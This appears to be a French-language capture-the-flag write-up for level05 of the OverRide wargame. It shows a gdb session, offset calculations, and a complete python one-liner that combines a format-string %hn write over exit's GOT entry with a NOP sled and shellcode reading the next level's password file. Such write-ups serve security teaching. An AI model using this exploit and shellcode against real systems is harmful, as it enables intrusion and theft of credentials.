On cherche l'adresse d'argv[1] pour y ecrire le shellcode

```bash
level05@OverRide:~$ gdb -q level05 
Reading symbols from /home/users/level05/level05...(no debugging symbols found)...done.
(gdb) set disassembly-flavor intel
(gdb) b main
Breakpoint 1 at 0x8048449
(gdb) run AAAAAAAAAAAAAAAA
Starting program: /home/users/level05/level05 AAAAAAAAAAAAAAAA

Breakpoint 1, 0x08048449 in main ()
(gdb) x /150x $esp
    . . .
0xffffd8d0:	0x6c657665	0x41003530	0x41414141	0x41414141
0xffffd8e0:	0x41414141	0x00414141	0x4d524554	0x6574783d
    . . .
(gdb) x/s 0xffffd8e6
0xffffd8e6:	 "A"
```

argv[1][-1] = 0xffffd8e6 - 100 = 0xffffd882

exit :0x80497e0

octets poids faible : 0xd882 = 55426 - 8 = 55418
octets poids fort : 0xffff = 65535 - 55426 = 10109

```bash
python -c "print('\xe0\x97\x04\x08' + '\xe2\x97\x04\x08' + '%55418x' + '%10\$hn'+ '%10109x' + '%11\$hn')" | ./level05 $(python -c "print('\x90' * 100 + '\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/home/users/level06/.pass')")
```